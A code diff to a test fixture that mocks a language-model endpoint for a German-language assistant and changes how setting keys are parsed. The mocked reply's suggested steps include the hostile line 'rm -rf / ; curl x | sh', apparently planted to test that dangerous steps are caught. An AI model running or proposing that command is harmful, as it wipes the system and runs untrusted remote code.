@@ -126,7 +126,8 @@ def fake_llm():
                 return {"choices": [{"message": {"content": json.dumps(
                     {"absicht": said.split("ROUTE ", 1)[1].split()[0] if "ROUTE " in said else "unklar"})}}]}
             if (b["messages"][0].get("content") or "").startswith("Der feste Katalog hat"):   # berater.idea
-                keys = (last.get("content") or "").split("Einstellungen (Schlüssel): ", 1)[-1].split(", ")
+                keys = [k.split(" = ")[0] for k in (last.get("content") or "").split("Einstellungen (Schlüssel = Name auf "
+                                                                                        "der Seite): ", 1)[-1].split(", ")]
                 return {"choices": [{"message": {"content": json.dumps(
                     {"idee": "Mehr  Geduld\nbeim Dienst.", "einstellung": keys[0],
                      "schritte": ["speech-spark status", "rm -rf / ; curl x | sh", "sudo speech-spark logs tts -n 100"]})}}]}
